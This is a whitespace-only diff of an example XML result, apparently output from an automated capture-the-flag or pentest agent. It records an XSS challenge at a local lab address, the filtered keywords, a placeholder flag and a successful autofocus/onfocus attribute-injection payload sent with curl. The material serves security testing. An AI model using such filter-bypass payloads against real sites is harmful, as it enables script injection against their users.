@@ -123,7 +123,7 @@ with ThreadPoolExecutor(20) as ex:
 <result>
   <status>success</status>
   <task_summary>通过属性注入绕过的 XSS - 使用 autofocus/onfocus</task_summary>
-  
+
   <attempts>
     <attempt seq="1" status="success">
       <action>curl -s http://192.168.64.1/</action>
@@ -146,13 +146,13 @@ with ThreadPoolExecutor(20) as ex:
       <insight>使用 autofocus/onfocus 的属性注入绕过了过滤器</insight>
     </attempt>
   </attempts>
-  
+
   <findings>
     <finding type="flag">FLAG{abc123}</finding>
     <finding type="filter">被阻止：script, onerror</finding>
     <finding type="bypass">允许：autofocus, onfocus, 属性注入</finding>
   </findings>
-  
+
   <successful_payload>curl -s "http://192.168.64.1/page?name=test\"&gt;&lt;input/autofocus/onfocus=alert(1)&gt;"</successful_payload>
 </result>
 ```
